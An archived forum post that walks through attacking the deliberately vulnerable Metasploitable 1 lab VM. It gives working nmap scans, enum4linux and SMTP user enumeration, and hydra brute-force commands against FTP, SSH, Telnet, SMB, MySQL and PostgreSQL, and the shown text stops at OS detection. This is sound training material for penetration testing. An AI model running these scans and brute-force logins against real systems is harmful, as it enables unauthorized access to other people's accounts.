<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Metasploitable 1 - Walkthrough - CTF - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Hey people! 
During my learning process I experimented a lot with this VM. In my opinion the vulnerabilities on this VM are pretty simple and you can optimize and improve your methodology on it. 
On this walkthrough I wi&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="3964.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="O2jrImMyGprJCPFT0Jo5z9ZSC"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="O2jrImMyGprJCPFT0Jo5z9ZSC"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Metasploitable 1 - Walkthrough&#39;" href="3964.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/3/36f4723c8c593bd654267a824f186ef0d8b6a2b6.PNG" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/3/36f4723c8c593bd654267a824f186ef0d8b6a2b6.PNG" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/metasploitable-1-walkthrough/3964" />
<meta property="og:title" content="Metasploitable 1 - Walkthrough" />
<meta name="twitter:title" content="Metasploitable 1 - Walkthrough" />
<meta property="og:description" content="Hey people!  During my learning process I experimented a lot with this VM. In my opinion the vulnerabilities on this VM are pretty simple and you can optimize and improve your methodology on it.  On this walkthrough I will show you how I‚Äôll go through without using MSF, Nessus, OpenVAS, etc.  For this I will using the basic setup of Kali.  Methodology:   Detect Living Host(s) Open TCP Ports Open UDP Ports Service Detection Service Enumeration User Enumeration from Services Password Profiling Bru..." />
<meta name="twitter:description" content="Hey people!  During my learning process I experimented a lot with this VM. In my opinion the vulnerabilities on this VM are pretty simple and you can optimize and improve your methodology on it.  On this walkthrough I will show you how I‚Äôll go through without using MSF, Nessus, OpenVAS, etc.  For this I will using the basic setup of Kali.  Methodology:   Detect Living Host(s) Open TCP Ports Open UDP Ports Service Detection Service Enumeration User Enumeration from Services Password Profiling Bru..." />
<meta property="og:article:section" content="CTF" />
<meta property="og:article:section:color" content="F1592A" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="4 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="27 ‚ù§" />
<meta property="article:published_time" content="2017-10-19T08:56:07+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="3964.html">Metasploitable 1 - Walkthrough</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/ctf/55.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #F1592A'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>CTF</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Metasploitable 1 - Walkthrough'>
      <link itemprop='url' href='3964.html'>
      <meta itemprop='datePublished' content='2017-10-19T08:56:07Z'>
        <meta itemprop='articleSection' content='CTF'>
      <meta itemprop='keywords' content=''>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Cry0l1t3.html'><span itemprop='name'>Cry0l1t3</span></a>
                
              </span>

                <link itemprop="mainEntityOfPage" href="3964.html">

                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/3/36f4723c8c593bd654267a824f186ef0d8b6a2b6.PNG">

              <span class="crawler-post-infos">
                  <time  datetime='2017-10-19T08:56:07Z' class='post-time'>
                    October 19, 2017,  8:56am
                  </time>
                  <meta itemprop='dateModified' content='2017-10-25T06:30:42Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Hey people!</p>
<p>During my learning process I experimented a lot with this VM. In my opinion the vulnerabilities on this VM are pretty simple and you can optimize and improve your methodology on it.<br>
On this walkthrough I will show you how I‚Äôll go through <strong>without</strong> using MSF, Nessus, OpenVAS, etc.</p>
<p>For this I will using the basic setup of Kali.</p>
<p><strong>Methodology:</strong></p>
<ol>
<li>Detect Living Host(s)</li>
<li>Open TCP Ports</li>
<li>Open UDP Ports</li>
<li>Service Detection</li>
<li>Service Enumeration</li>
<li>User Enumeration from Services</li>
<li>Password Profiling</li>
<li>Brute Forcing</li>
<li>Detect Running OS</li>
<li>Simple Vulnerabilities Detection</li>
<li>Manual Vulnerabilities Detection</li>
<li>Exploit Research</li>
<li>Exploit Fix</li>
<li>Exploitation</li>
<li>Post-Enumeration</li>
<li>Privilege Escalation</li>
<li>Proofs</li>
</ol>
<blockquote>
<p>Notice thats my methodology which I developed for the OSCP and are <strong>not</strong> the steps I‚Äôll going through. So I will possibly jump or skip over the topics.</p>
</blockquote>
<h1><a name="p-16696-h-1-detect-living-host-1" class="anchor" href="#p-16696-h-1-detect-living-host-1"></a>1. Detect Living Host</h1>
<p>So at first I want to detect the IP of the metasploitable VM.<br>
I‚Äôll use nmap for it.</p>
<p><code>nmap -sn -n 10.11.1.0/24 | grep for | cut -d" " -f5</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/3/36f4723c8c593bd654267a824f186ef0d8b6a2b6.PNG" data-download-href="/uploads/short-url/7Q9vr6i5nIUsVSgVEnt0M9GXake.PNG?dl=1" title="1..PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/36f4723c8c593bd654267a824f186ef0d8b6a2b6.PNG" width="450" height="220"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">1..PNG</span><span class="informations">761√ó369 129 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<h1><a name="p-16696-h-2-open-tcp-ports-2" class="anchor" href="#p-16696-h-2-open-tcp-ports-2"></a>2. Open TCP ports</h1>
<p>Now, after I detected the IP of the target (<strong>10.11.1.10</strong>) I will run a light TCP scan and try to detect open ports and the services running on it.</p>
<p><code>nmap -n -Pn -sS 10.11.1.10 --open --reason -sV --top-ports 200</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/3/38b387ab170610c7dfd3f9ae0ff9bcfaab5400af.PNG" data-download-href="/uploads/short-url/85BnwN6BI0Of0sTqXRw3hLCPFi7.png?dl=1" title="2.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/38b387ab170610c7dfd3f9ae0ff9bcfaab5400af.PNG" width="650" height="300"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">2.PNG</span><span class="informations">1140√ó484 312 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Sweet. Thats a lot of open ports. <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"><br>
So lets run a full and aggressive TCP scan in the background and at the same time I‚Äôll manually scan Samba &amp; SMTP services which will hopefully receive some users for this machine.</p>
<p><code># nmap -n -Pn -sS 10.11.1.10 --open --reason -A -p- &gt; metasploitable &amp;</code></p>
<p>Because I found a lot of open ports I‚Äôll jump to the <strong>User Enumeration</strong> topic.</p>
<h1><a name="p-16696-h-6-user-enumeration-from-services-3" class="anchor" href="#p-16696-h-6-user-enumeration-from-services-3"></a>6. User Enumeration from Services</h1>
<p>The heavy scan is running in the background so we can proceed and try to enumerate from  the Samba service some users using <strong>enum4linux</strong>:<br>
<code># enum4linux -U 10.11.1.10</code></p>
<p>Here is the output:<br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/d/d132981c86d87291f48e0ce23098cbe2ff1b901c.PNG" data-download-href="/uploads/short-url/tQEbI01XSXIEmU2coHyD67wHZmc.png?dl=1" title="3.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/d/d132981c86d87291f48e0ce23098cbe2ff1b901c.PNG" width="654" height="500"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">3.PNG</span><span class="informations">977√ó746 332 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Now I will create a userlist of the Samba service that I will use later.<br>
<code># !! | grep 'user:' | cut -d'[' -f2 | cut -d']' -f1 &gt; userlist</code></p>
<p>Lets check if I can find some users using <strong>smtp-user-enum.py</strong> with the VRFY command:<br>
<code># smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 10.11.1.10 &gt; smtp_users</code></p>
<p>Now I will generate an userlist of all the users I found.<br>
<code># cat smtp_users | grep exists | cut -d" " -f2 &gt;&gt; users</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/8/827603b7dcfd959cdb4cf244df584a197ae861d2.PNG" data-download-href="/uploads/short-url/iC6UNwN8QvsguBLyqaAXH2geo7M.PNG?dl=1" title="5.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/8/827603b7dcfd959cdb4cf244df584a197ae861d2.PNG" width="690" height="161"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">5.PNG</span><span class="informations">936√ó219 104 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Nice!<br>
If you noticed from above the heavy TCP scan has been finished too.<br>
Lets see which new ports has been found.</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/d/d6d4f67f6d2951f5096ccc5e24b7e8ca5ec89e4c.PNG" data-download-href="/uploads/short-url/uEurS3rRnIclSL612gxqAF1QtPK.PNG?dl=1" title="6.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/d/d6d4f67f6d2951f5096ccc5e24b7e8ca5ec89e4c.PNG" width="690" height="235"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">6.PNG</span><span class="informations">929√ó317 189 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<h1><a name="p-16696-h-7-password-profiling-4" class="anchor" href="#p-16696-h-7-password-profiling-4"></a>7. Password Profiling</h1>
<p>For the first step of password profiling I‚Äôll use the list of the usernames we previously enumerated as the first stage of my passwordlist.<br>
I will return to this point later when we take a look over other services.</p>
<h1><a name="p-16696-h-8-brute-forcing-5" class="anchor" href="#p-16696-h-8-brute-forcing-5"></a>8. Brute Forcing</h1>
<p>Now the heavy scan shows me two new ports (3632 &amp; 8180). Next I will use <strong>hydra</strong> to bruteforce the FTP, SSH, Telnet,  NetBIOS, MySQL and PostgreSQL service and try to login. As credentials I will use enumerated usernames as passwords.</p>
<p><strong>### FTP ###</strong><br>
<code>hydra -L users_metasploitable -e nsr ftp://10.11.1.10 -q -o ftp_login</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/f/f761cb1f7e98224bc60789d1a717e1609ab3c377.PNG" data-download-href="/uploads/short-url/zirsjylmi2eQZL18fhZ2YCPzROL.PNG?dl=1" title="8.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/f/f761cb1f7e98224bc60789d1a717e1609ab3c377.PNG" width="690" height="217"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">8.PNG</span><span class="informations">940√ó296 160 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p><strong>### SSH ###</strong><br>
<code>hydra -L users_metasploitable -e nsr ssh://10.11.1.10 -q -o ssh_login</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/4/47ad24cf863bb2029df21bfa7787dd221a982b74.PNG" data-download-href="/uploads/short-url/ae4Rh0MDLUA93FgYW7xOPLutcH2.PNG?dl=1" title="9.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/4/47ad24cf863bb2029df21bfa7787dd221a982b74.PNG" width="690" height="202"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">9.PNG</span><span class="informations">936√ó275 147 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p><strong>### Telnet ###</strong><br>
<code>hydra -L users_metasploitable -e nsr telnet://10.11.1.10 -q -o telnet_login</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/d/d04c427b9247043e9b6ee5eb98fa603f28e3632f.PNG" data-download-href="/uploads/short-url/tIGHmT8B1yEWpSNIfCJd6CMakJ9.PNG?dl=1" title="10.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/d/d04c427b9247043e9b6ee5eb98fa603f28e3632f.PNG" width="690" height="256"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">10.PNG</span><span class="informations">936√ó348 198 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p><strong>### NetBIOS ###</strong><br>
<code>hydra -L users_metasploitable -e nsr smb://10.11.1.10 -q -o smb_login</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/4/4f66bfa5f4bfd2ab7f1a14fab847677f863fa0d2.PNG" data-download-href="/uploads/short-url/bkpRcsQwanelUngyGBQaAzqBjqy.PNG?dl=1" title="11.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/4/4f66bfa5f4bfd2ab7f1a14fab847677f863fa0d2.PNG" width="690" height="205"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">11.PNG</span><span class="informations">938√ó280 150 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p><strong>### MySQL ###</strong><br>
<code>hydra -L users_metasploitable -e nsr mysql://10.11.1.10 -q -o mysql_login</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/d/d98455f51d5a9e9f0ca0facc9a70a0d27a0c2515.PNG" data-download-href="/uploads/short-url/v2f8CY7xcazoYyYpuwR8Awdyh8x.PNG?dl=1" title="12.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/d/d98455f51d5a9e9f0ca0facc9a70a0d27a0c2515.PNG" width="690" height="189"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">12.PNG</span><span class="informations">938√ó258 140 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p><strong>### PostgreSQL ###</strong><br>
<code>hydra -L users_metasploitable -e nsr postgres://10.11.1.10 -q -o postgres_login</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/3/35ca914f4ccd90491b01ad5a45afa0b085abf87f.PNG" data-download-href="/uploads/short-url/7FRiUBYu5V17GakaACkrhUqEepp.PNG?dl=1" title="13.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/3/35ca914f4ccd90491b01ad5a45afa0b085abf87f.PNG" width="690" height="188"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">13.PNG</span><span class="informations">937√ó256 134 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Very nice!<br>
There are a lot of accounts we can use to login on the machine. <img src="../../images/emoji/twitter/smiley8e5e.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"><br>
But first let me compare the results to one single list.</p>
<p><code>cat ftp_login mysql_login postgres_login smb_login ssh_login telnet_login | grep host | column -t &gt; metasploitable_accounts</code></p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="../../../0x00sec.s3.amazonaws.com/original/2X/9/9e74f66bcfb970721bbf0af47667ad6c733d2f83.PNG" data-download-href="/uploads/short-url/mBM1X7kEib6RschRTJRDTSXJYZ5.png?dl=1" title="14.PNG" rel="noopener nofollow ugc"><img src="../../../0x00sec.s3.amazonaws.com/original/2X/9/9e74f66bcfb970721bbf0af47667ad6c733d2f83.PNG" width="690" height="362"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">14.PNG</span><span class="informations">926√ó486 244 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>As you can see, it was a quick task and we have some accounts we can use to login but the user <strong>msfadmin</strong> looks like it could be in the sudoers group. So I will start with this user.</p>
<h1><a name="p-16696-h-9-os-detection-6" class="anchor" href="#p-16696-h-9-os-detection-6"></a>9. OS Detection</h1>
